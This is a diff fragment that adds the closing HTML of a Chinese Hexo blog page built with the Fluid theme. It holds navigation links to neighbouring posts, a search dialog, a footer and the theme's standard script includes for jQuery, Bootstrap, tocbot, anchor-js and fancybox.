+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/12/20/WAFPecker/" title="WAFPecker">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">WAFPecker</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/11/18/XU17/" title="XU17">
+                        <span class="hidden-mobile">XU17</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
